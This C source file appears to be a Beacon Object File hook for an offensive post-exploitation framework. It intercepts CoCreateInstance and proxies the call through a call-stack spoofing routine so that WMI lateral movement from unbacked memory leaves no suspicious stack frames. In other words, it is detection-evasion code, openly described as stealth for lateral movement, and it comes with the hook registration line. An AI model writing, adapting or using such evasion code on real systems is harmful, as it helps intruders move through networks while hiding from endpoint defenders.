/*
 * CoCreateInstance Hook — WMI Lateral Movement Stealth
 *
 * The remote-exec wmi command calls CoCreateInstance to instantiate the
 * WMI COM object on the remote host. This triggers an internal
 * LoadLibraryExW for wbemprox.dll. Because the BOF executes from
 * unbacked memory, the resulting load event's call stack contains
 * unbacked frames.
 *
 * Hooking CoCreateInstance within the PICO and proxying the call
 * through spoof_call() removes the unbacked frames.
 *
 * Register in spec file:
 *   addhook "OLE32$CoCreateInstance" "_CoCreateInstance"
 */

#include <windows.h>
#include <objbase.h>

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);

HRESULT WINAPI _CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter,
                                  DWORD dwClsContext, REFIID riid, LPVOID *ppv) {
    FUNCTION_CALL call = {0};
    call.ptr  = (PVOID)OLE32$CoCreateInstance;
    call.argc = 5;
    call.args[0] = spoof_arg(rclsid);
    call.args[1] = spoof_arg(pUnkOuter);
    call.args[2] = spoof_arg(dwClsContext);
    call.args[3] = spoof_arg(riid);
    call.args[4] = spoof_arg(ppv);
    return (HRESULT)spoof_call(&call);
}
